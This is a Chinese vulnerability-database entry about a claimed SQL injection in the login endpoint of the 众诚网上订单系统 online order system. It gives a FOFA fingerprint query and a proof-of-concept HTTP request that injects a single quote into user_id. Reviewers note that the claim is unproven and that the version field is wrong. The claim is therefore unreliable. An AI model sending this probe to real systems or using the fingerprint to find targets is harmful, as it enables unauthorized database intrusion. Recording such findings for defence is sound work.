---
source: "wy876 漏洞文库"
title: "众诚网上订单系统 o_sa_order login user_id SQL注入声称"
product: "众诚网上订单系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本字段错误填DBApi"
prerequisites: "登录前请求示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ey0ogvbchsz4zpil"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BC%97%E8%AF%9A%E7%BD%91%E4%B8%8A%E8%AE%A2%E5%8D%95/%E4%BC%97%E8%AF%9A%E7%BD%91%E4%B8%8A%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9Fo_sa_order%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"欢迎使用众诚网上订单系统\""
id: "vw-e84a67a2ce0a4a066829db81"
entity_id: "ve-e84a67a2ce0a4a066829db81"
schema_version: "1"
previous_fofa_unverified: "title="
---

# 众诚网上订单系统 o_sa_order login user_id SQL注入声称

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：众诚网上订单系统；o_sa_order login user_id SQL注入声称
- 版本、配置及部署条件：版本字段错误填DBApi
- 认证与权限前提：登录前请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 影响版本DBApi是另一产品或错误模板，需纠正
- 只给admin单引号、无错误响应/真假条件，不能证明SQLi
- 登录错误与注入错误需区分；补根因/修复/版本和参数证据
- Host空，标题产品与分类可保留

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
众诚网上订单系统o_sa_order存在SQL注入漏洞，攻击者可获取数据库敏感信息。

## 二、影响版本
+ DBApi

## 三、资产测绘
+ fofa`title="欢迎使用众诚网上订单系统"`
+ 特征


## 四、漏洞复现
```http
POST /ajax/o_sa_order.ashx HTTP/1.1
Host: 
Content-Length: 42
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
 
type=login&user_id=admin'&user_pwd=1111111
```

> 请求长度说明：原资料 Content-Length 为 42；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey0ogvbchsz4zpil>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
